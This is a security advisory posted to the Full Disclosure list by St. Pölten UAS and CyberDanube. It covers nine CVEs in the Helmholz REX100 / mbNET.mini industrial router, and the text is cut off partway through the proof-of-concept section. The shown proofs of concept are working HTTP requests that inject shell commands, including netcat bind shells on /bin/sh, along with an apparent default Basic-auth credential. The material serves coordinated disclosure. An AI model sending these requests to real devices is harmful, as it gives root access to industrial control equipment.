---
title: St. Pölten UAS 20250721-0 | Multiple Vulnerabilities in Helmholz Industrial Router REX100 / mbNET.mini
url: https://seclists.org/fulldisclosure/2025/Jul/38
source: Full Disclosure
date: 2025-07-31
fetch_date: 2025-10-06T23:56:30.093080
---

# St. Pölten UAS 20250721-0 | Multiple Vulnerabilities in Helmholz Industrial Router REX100 / mbNET.mini

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](37)
[By Date](date.html#38)
[![Next](/images/right-icon-16x16.png)](39)

[![Previous](/images/left-icon-16x16.png)](37)
[By Thread](index.html#38)
[![Next](/images/right-icon-16x16.png)](39)

![](/shared/images/nst-icons.svg#search)

# St. Pölten UAS 20250721-0 | Multiple Vulnerabilities in Helmholz Industrial Router REX100 / mbNET.mini

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 24 Jul 2025 10:16:45 +0000

---

```
St. Pölten UAS 20250721-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities in REX100
              product| Helmholz Industrial Router REX100 / mbNET.mini
   vulnerable version| < 2.3.3
        fixed version| 2.3.3
           CVE number| CVE-2025-41673, CVE-2025-41674, CVE-2025-41675,
                     | CVE-2025-41676, CVE-2025-41677, CVE-2025-41678,
                     | CVE-2025-41679, CVE-2025-41680, CVE-2025-41681
               impact| High
             homepage| https://www.helmholz.de/
                       | https://mbconnectline.com/
                found| 2025-04-25
                   by| F. Bruckmoser, M. Eder, J. Heigl, M. Heudorn,
                 | G. Hofmarcher, M. Kadlec, M. Pristauz-Telsnigg
                 | S. Resch, P. Schweinzer, M. Gschiel
                 |
                     | These vulnerabilities were discovered during research at
                     | St.Pölten UAS, supported and coordinated by CyberDanube.
                     |
                     | https://fhstp.ac.at | https://cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Helmholz is your specialist when it comes to sophisticated products for your
automation projects. With current, clever system solutions from Helmholz, the
high demands placed on industrial networks in times of increasing automation
can be met both reliably and efficiently - including a high level of operating
convenience. The broad product spectrum ranges from a decentralized I/O system
to switches and repeaters, gateways, a NAT gateway/firewall and secure IoT
remote machine access."

Source: https://www.helmholz.de/en/company/about-helmholz/

Vulnerable versions
-------------------------------------------------------------------------------
Helmholz Industrial Router REX100 < 2.3.3
MBConnectline mbNET.mini < 2.3.3

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Command Injection via send_sms (CVE-2025-41674)
A command injection vulnerability has been identified in the send_sms
functionality of the device. An authenticated attacker can exploit this issue
to execute arbitrary commands as root on the device.

2) Authenticated Command Injection via diag (CVE-2025-41673)
A command injection vulnerability has been identified in the diag
functionality of the device. An authenticated attacker can exploit this issue
to execute arbitrary commands as root on the device.

3) Authenticated Command Injection via communication.sh (CVE-2025-41675)
A command injection vulnerability has been identified in the communication.sh
endpoint of the device. An authenticated attacker can exploit this issue to
execute arbitrary commands as root on the device.

4) Authenticated Denial of Service via send_sms (CVE-2025-41677)
An denial of service condition has been identifed in the send_sms functionality
of the device. An authenticated attacker can exploit this issue to make the
device unresponsive until reboot.

5) Authenticated Denial of Service via send_mail (CVE-2025-41676)
An denial of service condition has been identifed in the send_mail
functionality of the device. An authenticated attacker can exploit this issue
to make the device unresponsive until reboot.

6) Authenticated SQL Injection via cloud-status.sh (CVE-2025-41678)
A sql injection has been identified in the cloud-status.sh endpoint of the
device. The issue can be exploited by an authenticated attacker to read out or
modify the sqlite database of the device.

7) Unauthenticated Buffer Overflow via confnet/serial (CVE-2025-41679)
A buffer overflow issue exists in the confnet service in the "serial" function
of the device. An unauthenticated attacker can exploit this issue to crash the
service or gain remote code execution on the device.

8) Unauthenticated Buffer Overflow via confnet/command (CVE-2025-41679)
A buffer overflow issue exists in the confnet service in the "command" function
of the device. An unauthenticated attacker can exploit this issue to crash the
service or gain remote code execution on the device.

9) Authenticated Persistent XSS via cloud-configure.sh (CVE-2025-41681)
A persistent XSS vulnerability has been identified in the cloud-configure.sh
endpoint of the device. An authenticated attacker can abuse this issue to
execute malicious javascript in the victims browser when using the web service
of the device.

Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Command Injection via send_sms (CVE-2025-41674)
The action send_sms in the file /cgi-bin/cloud-status.sh is vulnerable to a
command injection. The following POST request can be used to create the file
/hello.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /cgi-bin/api.sh HTTP/1.1
Host: 10.69.43.18
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101
Firefox/138.0
Accept: text/plain, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 74
Origin: http://10.69.34.3
DNT: 1
Sec-GPC: 1
Authorization: Basic <redacted>
Connection: keep-alive
Referer: http://10.69.34.3/cgi-bin/cloud-status.sh
action=send_sms&numb='test'&text='test$(echo helloThere > /hello.txt)'

-------------------------------------------------------------------------------
2) Authenticated Command Injection via diag (CVE-2025-41673)
The action diag in the file /cgi-bin/cloud-status.sh is vulnerable to a command
injection. The following POST request can be used to start a binding shell on
port 8080.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /cgi-bin/api.sh HTTP/1.1
Host: 10.69.45.3
Content-Length: 71
Authorization: Basic <redacted>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: keep-alive
action=diag&operation=portcheck&parameter=-l -w 9999 -p 8080 -e /bin/sh

-------------------------------------------------------------------------------
3) Authenticated Command Injection via communication.sh (CVE-2025-41675)
The action nc in the file communication.sh is vulnerable to a command injection
the following GET request can be used to start a binding shell on port 1337.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl 'http://192.168.0.100/cgi-bin/cloudsvr/communication.sh?action=nc&parameter=-l%20-p%201337%20-e%20%2Fbin%2Fsh'; \
  -H 'Authorization: Basic aGVsbWhvbHo6cm91dGVy' \
  --insecure

-------------------------------------------------------------------------------
4) Authenticated Denial of Service via send_sms (CVE-2025-41676)
The action send_sms is vul...